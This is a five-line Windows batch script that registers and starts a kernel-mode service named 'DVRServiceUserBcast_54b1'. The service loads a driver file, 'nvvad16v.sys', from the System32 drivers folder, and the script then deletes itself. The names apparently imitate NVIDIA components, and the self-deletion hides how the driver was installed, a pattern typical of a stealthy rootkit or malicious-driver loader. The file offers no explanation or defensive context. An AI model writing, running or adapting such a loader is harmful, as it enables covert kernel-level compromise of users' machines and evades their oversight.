@echo off
cd %~dp0
sc create DVRServiceUserBcast_54b1 binpath=C:\Windows\System32\drivers\nvvad16v.sys type=kernel
sc start DVRServiceUserBcast_54b1
del "%~f0"



